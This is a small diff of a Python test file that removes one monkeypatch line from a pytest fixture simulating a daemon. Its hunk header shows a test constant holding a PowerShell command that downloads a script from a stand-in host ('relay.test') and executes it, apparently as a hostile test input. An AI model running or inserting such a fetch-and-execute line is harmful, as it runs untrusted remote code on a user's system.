@@ -23,7 +23,6 @@ WIN = "& ([scriptblock]::Create((irm https://relay.test/tether/win))) acre fox k
 def daemon(monkeypatch):
     """A daemon that mints slot 7 and then reports it, owner and all."""
     monkeypatch.setattr(paths, "ROLE", paths.OPERATOR)
-    monkeypatch.setattr(hub_adapter, "DECLARED", {})
     state = {"owner": None, "calls": []}
 
     async def call(verb, args, timeout):
